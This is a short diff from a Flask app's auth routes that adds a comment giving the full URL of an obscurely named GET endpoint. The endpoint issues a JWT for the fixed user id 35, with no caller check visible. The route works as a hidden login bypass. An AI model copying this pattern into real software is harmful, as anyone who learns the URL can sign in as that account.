@@ -31,7 +31,7 @@ def new_google_login(name,id_token,email,picture,id):
         set_refresh_cookies(response, jwt['refresh_token'])
         return response
 
-
+#https://robotsevolved.com/auth/customuser1349230419823212334124
 @bp.route('/customuser1349230419823212334124',methods=('GET',))
 def customuser1292834():
     jwt = UserService().create_jwt(35)
